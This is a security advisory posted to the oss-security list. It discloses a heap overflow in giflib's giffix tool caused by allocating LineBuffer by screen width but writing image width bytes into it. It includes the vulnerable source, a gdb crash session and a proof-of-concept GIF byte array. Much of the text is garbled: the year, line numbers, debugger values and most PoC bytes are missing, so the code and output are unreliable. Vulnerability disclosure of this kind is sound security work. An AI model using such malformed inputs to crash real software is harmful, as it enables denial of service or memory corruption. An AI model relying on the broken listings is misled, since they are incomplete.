  oss-security - giflib: heap overflow in giffix            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 21 Dec From: Hans Jerry Illikainen <hji@...topia.com> To: bugtraq@...urityfocus.com, fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: giflib: heap overflow in giffix   About =====  giflib[1] is a library for working with GIF images.  It also provides several command-line utilities.   =============  A heap overflow may occur in the giffix utility included in when processing records of the type `IMAGE_DESC_RECORD_TYPE' due to the allocated size of `LineBuffer' equaling the value of the logical screen width, `GifFileIn->SWidth', while subsequently having `GifFileIn->Image.Width' bytes of data written to it.   ,---- | int main(int argc, char **argv) | { |     [...] |     if ((LineBuffer = (GifRowType) malloc(GifFileIn->SWidth)) == NULL) |         GIF_EXIT("Failed to allocate memory required, aborted."); |  |     /* Scan the content of the GIF file and load the image(s) in: */ |     do { |         [...] |         switch (RecordType) { |             case IMAGE_DESC_RECORD_TYPE: |                 if (DGifGetImageDesc(GifFileIn) == GIF_ERROR) |                     QuitGifError(GifFileIn, GifFileOut); |                 [...] |                 Width = GifFileIn->Image.Width; |                 Height = GifFileIn->Image.Height; |                 [...] |                 /* Find the darkest color in color map to use as a filler. */ |                 ColorMap = (GifFileIn->Image.ColorMap ? GifFileIn->Image.ColorMap : |                                                      GifFileIn->SColorMap); |                 for (i = 0; i < ColorMap->ColorCount; i++) { |                     j = ((int) ColorMap->Colors[i].Red) * 30 + |                         ((int) ColorMap->Colors[i].Green) * 59 + |                         ((int) ColorMap->Colors[i].Blue) * 11; |                     if (j < ColorIntens) { |                         ColorIntens = j; |                         DarkestColor = i; |                     } |                 } |  |                 /* Load the image, and dump it. */ |                 for (i = 0; i < Height; i++) { |                     GifQprintf("\b\b\b\b%-4d", i); |                     if (DGifGetLine(GifFileIn, LineBuffer, Width) |                         == GIF_ERROR) break; |                     if (EGifPutLine(GifFileOut, LineBuffer, Width) |                         == GIF_ERROR) QuitGifError(GifFileIn, GifFileOut); |                 } |  |                 if (i < Height) { |                     [...] |                     /* Fill in with the darkest color in color map. */ |                     for (j = 0; j < Width; j++) |                         LineBuffer[j] = DarkestColor; |                     for (; i < Height; i++) |                         if (EGifPutLine(GifFileOut, LineBuffer, Width) |                             == GIF_ERROR) QuitGifError(GifFileIn, GifFileOut); |                 } |                 break; |             [...] |         } |     } |     while (RecordType != TERMINATE_RECORD_TYPE); |     [...] | } `----  ,---- | $ gdb -q --args ./giffix heap.gif | Reading symbols from ./giffix...done. | (gdb) b util/giffix.c:94 | Breakpoint 1 at file giffix.c, line 94. | (gdb) b | Breakpoint 2 at file giffix.c, line | (gdb) b | Breakpoint 3 at file giffix.c, line |  | (gdb) commands 3 | Type commands for breakpoint(s) 3, one per line. | End with a line saying just "end". | >printf "%p, LineBuffer+j, DarkestColor | >c | >end |  | (gdb) r | [...] | Breakpoint 1, main (argc=2, at giffix.c:94 | 94      if ((LineBuffer = (GifRowType) malloc(GifFileIn->SWidth)) == NULL) |  | (gdb) p GifFileIn->SWidth | $1 = 1 |  | (gdb) c | [...] | Breakpoint 2, main (argc=2, at |             for (j = 0; j < Width; j++) |  | (gdb) p Width | $2 = |  | (gdb) c | Continuing. |  | Breakpoint 3, main (argc=2, at |             LineBuffer[j] = DarkestColor; | |  | [...] |  | Breakpoint 3, main (argc=2, at |             LineBuffer[j] = DarkestColor; | |  | [...] |  | Breakpoint 3, main (argc=2, at |             LineBuffer[j] = DarkestColor; | |  | Program received signal SIGSEGV, Segmentation fault. | in GifFreeMapObject at gifalloc.c:80 | 80          (void)free(Object->Colors); `----   heap.gif: ,---- | unsigned char heap[] = { |     /* GIF87a */ |     |  |     /* DGifGetScreenDesc() */ |             /* GifFile->SWidth */ |             /* GifFile->SHeight */ |                   /* ColorCount = 1 << ((this & + 1) */ |                   /* GifFile->SBackGroundColor */ |                   /* GifFile->AspectByte */ |       /* GifFile->SColorMap->Colors[0] */ |       /* GifFile->SColorMap->Colors[1] */ |  |     /* DGifGetRecordType() */ |     0x2c,               /* DESCRIPTOR_INTRODUCER */ |  |     /* DGifGetImageDesc() */ |             /* GifFile->Image.Left */ |             /* GifFile->Image.Top */ |     0xff,         /* GifFile->Image.Width */ |             /* GifFile->Image.Height */ |                   /* BitsPerPixel = (this & + 1 */ |  |     /* DGifSetupDecompress() */ |                   /* CodeSize */ |  |     /* end of image data */ |     |  |     /* end of gif */ |     0x3b | }; `----   Solution ========  No fix exists as of yet.    Footnotes _________  [1] [http://giflib.sourceforge.net/]   Hans Jerry Illikainen  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      